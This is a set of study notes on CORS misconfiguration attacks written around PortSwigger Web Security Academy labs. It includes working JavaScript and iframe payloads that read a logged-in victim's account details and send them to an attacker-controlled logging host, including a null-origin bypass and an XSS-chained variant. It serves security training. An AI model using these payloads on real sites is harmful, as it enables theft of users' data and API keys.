# CORS Notes

[Portswigger](https://portswigger.net/web-security/cors#what-is-cors-cross-origin-resource-sharing)

## Methodology

Example script to steal info from a user

```
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener() {
	location='//malicious-website.com/log?key='+this.responseText;
};
```

Using that script in an iframe for a whitelisted null in the origin value:

```
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener() {
location='malicious-website.com/log?key='+this.responseText;
};
</script>"></iframe>
```


## Labs Walkthrough

### CORS Vulnerability with Basic Origin Reflection Attack

- log into application and review the request to /accountDetails
- notice the usage of the `Access-Control-Allow-Origin` header, suggesting the usage of CORS
- ![image](https://github.com/user-attachments/assets/88d4be40-617a-442d-b257-20e37916e5e5)
- - we can validate it reflects the cors by adding an arbitrary Origin header with anything and view the response `Access-Control-Allow-Origin` header having our arbitrary value reflected
- ![image](https://github.com/user-attachments/assets/282744d5-6db9-4474-ad93-66a449f30432)
- create the request by using the /accountDetails as the path for sensitive data and set location to just /log

```
<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','0aab0073041f4fa4815f39dc00ce00a4.web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();

function reqListener() {
location='/log?key='+this.responseText;
};
</script>
```

- after storing and delivering to the victim, go to access log to find the api key to submit

### CORS Vulnerability with trusted null origin

- again login with creds and view the login and notice the `/accountDetails` page
- you can add null in this request to validate that it does accept null and `Access-Control-Allow-Credentials` is set to true
- ![image](https://github.com/user-attachments/assets/8ee159ca-75a2-4259-ab7d-9a4f12440cf1)
- now craft exploit to abuse, using sample from methodology above

```
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','0a74004304f82b2983e2d8ec00d8009c.web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();

function reqListener() {
location='/log?key='+this.responseText;
};
</script>"></iframe>
```

- store and view, check your api creds get logged, then deliver to victim to steal theirs

### CORS vulnerability with trusted insecure protocols

- Review the history and observe that your key is retrieved via an AJAX request to /accountDetails, and the response contains the Access-Control-Allow-Credentials header suggesting that it may support CORS.
- Send the request to Burp Repeater, and resubmit it with the added header Origin: http://subdomain.lab-id where lab-id is the lab domain name.
- Observe that the origin is reflected in the Access-Control-Allow-Origin header, confirming that the CORS configuration allows access from arbitrary subdomains, both HTTPS and HTTP.
- Open a product page, click Check stock and observe that it is loaded using a HTTP URL on a subdomain
- Observe that the productID parameter is vulnerable to XSS
- In the browser, go to the exploit server and enter the following HTML, replacing YOUR-LAB-ID with your unique lab URL and YOUR-EXPLOIT-SERVER-ID with your exploit server ID

```
<script>
document.location="http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
</script>
```

- click view exploit, check if it works and send to victim
